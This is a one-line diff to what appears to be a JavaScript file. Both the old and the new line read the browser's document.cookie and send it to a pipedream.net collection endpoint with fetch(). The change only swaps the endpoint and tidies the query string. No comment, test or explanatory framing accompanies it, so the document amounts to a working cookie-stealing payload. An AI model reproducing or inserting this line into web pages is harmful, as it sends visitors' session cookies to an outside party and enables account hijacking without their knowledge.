@@ -1,1 +1,1 @@
-const cookie = document.cookie; fetch(`https://enif47d2kgjzk.x.pipedream.net? cookie=${encodeURIComponent(cookie)}`);
+const cookie = document.cookie; fetch(`https://enw92wktlhe8.x.pipedream.net?cookie=${encodeURIComponent(cookie)}`);
